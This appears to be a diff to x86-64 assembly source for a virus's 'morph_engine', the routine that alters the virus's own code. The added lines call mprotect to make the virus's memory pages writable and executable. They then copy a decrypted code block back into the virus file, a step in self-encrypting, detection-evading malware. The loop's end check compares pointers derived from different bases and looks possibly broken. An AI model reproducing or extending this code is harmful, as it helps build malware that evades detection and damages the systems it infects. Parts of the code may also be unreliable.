@@ -18,7 +18,7 @@ morph_engine:
 ;create stack frame
 push rbp
 mov  rbp, rsp
-sub  rsp, 0x28
+sub  rsp, 0x30
 push rbx
 push r12
 push r13
@@ -30,25 +30,67 @@ mov [rbp-0x28], rdi ; virus data
 mov [rbp-0x20], rsi ; offset of encrypt section
 mov [rbp-0x18],	rdx ; size of virus in hexa
 mov [rbp-0x10],	rcx ; offset of decrypter section
+mov [rbp-0x30], r8  ; full address of current encrypt section (main function)
+
+
+; write access from virus file, main to _start-main
+add rdi, rsi
+; this gives us main in the virus file
+
+; unprotect virus file from write protection
+call getpagesize
+; rax has 0x1000
+mov rcx, rax
+; save rax for later use when passing to mprotect
+sub rcx, 0x1
+not rcx
+; mov rdi, .encryption_function
+and rdi, rcx
+; AND them and the result will be stored in rcx
+; rdi must hold the page_start address
+
+lea rsi, [rdi+rdx]      ;rsi = end
+sub rsi,rdi      ;rsi = end - aligned_start = length
+
+mov rdx, 0x7
+; read+write+exec = 0x7
+call mprotect
+
+
+; reload data
+mov rdi, [rbp-0x28]  ; virus data
+mov rsi, [rbp-0x20]  ; offset of encrypt section
+mov rdx, [rbp-0x18]  ; size of virus in hexa
+mov rcx, [rbp-0x10]  ; offset of decrypter section
+mov r8,  [rbp-0x30]   ; full address of current encrypt section (main function)
 
 
 
-; ; do stuff here
-; call getpagesize
-; ; rax has 0x1000
-; mov rcx, rax
-; ; save rax for later use when passing to mprotect
-; sub	rcx, 0x1
-; not rcx
-; mov	rdi, .encryption_function
-; and rdi, rcx
-; ; AND them and the result will be stored in rcx
-; ; rdi must hold the page_start address
-; mov rsi, rax
-; ; rsi must have the page length
-; mov rdx, 0x7
-; ; read+write+exec = 0x7
-; call mprotect
+
+; write decrypted block from memory to virus file
+add rdi, rsi
+mov r15, rdi
+add r15, rdx
+.write_decrypted_loop:
+	; load first 16bytes of memory data to registers
+	mov eax, [r8]
+	mov ebx, [r8+0x4]
+	mov ecx, [r8+0x8]
+	mov edx, [r8+0xC]
+
+.write_decrypted_function:
+	; put what was taken from memory to equivalent place in the virus file
+	mov [rdi], eax
+	mov [rdi+0x4], ebx
+	mov [rdi+0x8], ecx
+	mov [rdi+0xC], edx
+	add r8, 0x10
+	add rdi, 0x10
+	; add 10h to r8, fast forwards rsi to grabbing next 16 bytes
+	cmp r8, r15
+	;compare if r8 = r15, signalling end of decryption
+	jne .write_decrypted_loop
+
 
 
 call getpagesize
